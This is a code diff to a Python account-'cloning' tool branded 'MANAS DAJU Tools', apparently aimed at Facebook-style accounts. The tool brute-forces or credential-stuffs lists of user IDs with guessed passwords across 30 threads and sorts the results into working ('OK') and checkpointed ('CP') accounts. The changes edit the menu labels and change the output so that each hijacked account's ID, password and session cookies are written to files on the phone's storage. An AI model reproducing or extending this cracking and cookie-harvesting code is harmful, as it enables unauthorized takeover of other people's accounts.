@@ -208,8 +208,8 @@ logo ="""
 
 os.system('clear')
 print(logo)
-os.system('espeak -a 300 " Your,   Real,  Name,"')
-uname =input('\033[1;97m[\033[1;92m•\x1b[38;5;231m WHAT IS YOUR NAME : \x1b[38;5;231m')
+os.system('espeak -a 300 " Enter,  Your,   Real,  Name,"')
+uname =input('\033[1;97m[\033[1;92m•]\x1b[38;5;231m WHAT IS YOUR NAME : \x1b[38;5;231m')
 os.system('espeak -a 300 " Welcome,   to,  MANAS,  DAJU,  Tools"')
 pass
  
@@ -471,6 +471,7 @@ def crack_file():
     print('\x1b[38;5;231m---------------------')
     #os.system#('espeak -a 300 " your file name"')
     print('\x1b[38;5;231m[ /sdcard/file.txt  Etc...]')
+    print('\x1b[38;5;231m-----------------------')
     o = input('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mENTER FILE NAME:\033[0;91m ')
     try:lin = open(o).read().splitlines()
     except:
@@ -486,9 +487,9 @@ def crack_file():
  
 def setting():
     print('\x1b[38;5;231m----------------------------------')
-    print("\x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37mCLONING FOR ONLY OLD IDz")
-    print("\x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m CLONING FOR ONLY NEW IDz")
-    print("\x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37mCLONING FOR MIX IDz")
+    print("\x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37mCLONING FOR ONLY OLD IDz")
+    print("\x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37mCLONING FOR ONLY NEW IDz")
+    print("\x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37mCLONING FOR MIX IDz")
     print('\x1b[38;5;231m----------------------------------')
     hu = input('\x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37mCHOOSE :\033[0;91m ')
     if hu in ['1','01']:
@@ -532,11 +533,11 @@ def setting():
 def passwrd():
     os.system('clear')
     print(logo)
-    print(f"\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mUSER NAME\033[0;91m :\033[0;91m "+uname)
-    print("\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mTODAY'S DATE :\033[0;91m "+date)
-    print('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mYOUR TOTAL IDz \033[0;91m:\033[0;91m ',str(len(id)))
-    print("\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mSTARTED YOUR CLONING TIME\033[0;91m :> \033[0;91m"+time.strftime("%H:%M")+" "+ tag)
-    print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mUSE FLIGHT MODE FOR SPEED UP ')
+    print(f"\x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37mUSER NAME\x1b[38;5;208m :\x1b[38;5;208m "+uname)
+    print("\x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37mTODAY'S DATE :\x1b[38;5;208m "+date)
+    print('\x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37mYOUR TOTAL IDz \033[0;91m:\x1b[38;5;208m ',str(len(id)))
+    print("\x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37mSTARTED YOUR CLONING TIME\x1b[38;5;208m :> \x1b[38;5;208m"+time.strftime("%H:%M")+" "+ tag)
+    print(f'\x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37mUSE FLIGHT MODE FOR SPEED UP ')
     print('\x1b[38;5;231m--------------------------------------------------')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -635,7 +636,7 @@ def crack(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
              #   print(f#'\r\033[0;94m[MANAS-Cp] {idf} • {pw}')
                # os.system#('espeak -a 300 " Cp,"')
-                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
+                open('/sdcard/MANAS-CP.txt/'+cpc,'a').write(idf+'|'+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -645,7 +646,7 @@ def crack(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
                 #os.system#@('espeak -a 300 " MANAS,  Ok,  id"')
-                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+                open('/sdcard/MANAS-OK.txt/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                 break
                 
             else:
@@ -677,7 +678,7 @@ def crackfree(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
                 #os.system#('espeak -a 300 " Cp,"')
-                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
+                open('/sdcard/MANAS-CP.txt/'+cpc,'a').write(idf+'|'+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
                 break
@@ -687,7 +688,7 @@ def crackfree(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
                # os.system#('espeak -a 300 " Ok,  MANAS,  id"')
-                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+                open('/sdcard/MANAS-OK.txt/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                 break
                 
             else:
